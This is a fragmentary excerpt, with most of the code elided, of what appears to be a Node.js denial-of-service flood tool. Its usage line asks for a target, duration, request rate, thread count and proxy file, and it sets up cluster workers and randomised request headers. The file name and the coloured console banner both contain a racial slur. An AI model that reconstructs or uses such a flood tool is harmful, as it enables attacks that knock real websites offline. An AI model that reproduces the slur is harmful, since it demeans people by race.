const net = require("net");
 ...
 if (process.argv.length < 7){console.log(`Usage: node niggers.js target time rate thread proxyfile`.rainbow); process.exit();}
 const headers = {};
...
let randomHeaders = headerGenerator.getHeaders();
 ...
 if (cluster.isMaster){
    ...
    console.log('\x1b[38;2;255;0;0m' +  'NIGGERS'.bgRed);
    console.log(`╔═════════╩═════════════════════════════════╩═════════╗`.gray)
